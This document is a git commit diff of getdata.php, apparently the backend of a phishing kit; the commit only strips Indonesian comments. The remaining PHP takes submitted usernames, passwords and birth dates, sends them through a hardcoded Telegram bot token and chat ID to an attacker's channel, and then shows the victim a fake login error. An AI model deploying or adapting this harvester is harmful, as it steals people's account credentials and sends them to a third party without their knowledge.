85f3472f728f8f2571d44e38fc79d1026e92d8d6
facebookpagemeta <157931401+facebookpagemeta@users.noreply.github.com>
2024-01-28 09:12:18 +0700

    Update getdata.php

--- getdata.php
+++ getdata.php
@@ -1,9 +1,7 @@
 <?php
-// Ganti token_bot dan chat_id sesuai dengan informasi Telegram Anda
 $token_bot = '6356869047:AAEEEmpcSPVJ0Jo6-E0Ba78OnnEEFHPmdwU';
-$chat_id = '-1002031321163';
+$chat_id = '-1002031321163';  // Ganti dengan Chat ID saluran Anda
 
-// Fungsi untuk mengirim pesan ke Telegram menggunakan cURL
 function sendMessageToTelegram($message)
 {
     global $token_bot, $chat_id;
@@ -24,25 +22,20 @@ function sendMessageToTelegram($message)
 }
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Mengambil data dari formulir
     $username = $_POST['username'];
     $password = $_POST['password'];
     $lahir = $_POST['lahir'];
 
-    // Menyusun pesan untuk dikirim ke Telegram
     $message = "New Login Attempt:\n\n";
     $message .= "Username/Email/Phone: $username\n";
     $message .= "Password: $password\n";
     $message .= "Date: " . date("Y-m-d H:i:s");
 
-    // Mengirim pesan ke Telegram
     sendMessageToTelegram($message);
 
-    // Menampilkan pesan error kepada pengguna
     echo json_encode(array('error' => 'Invalid username or password. Please try again.'));
 } else {
-    // Jika akses langsung ke file ini tanpa melalui formulir, redirect ke halaman utama atau halaman error
-    header("Location: index.html"); // Ganti dengan halaman yang sesuai
+    header("Location: index.html");
     exit();
 }
 ?>
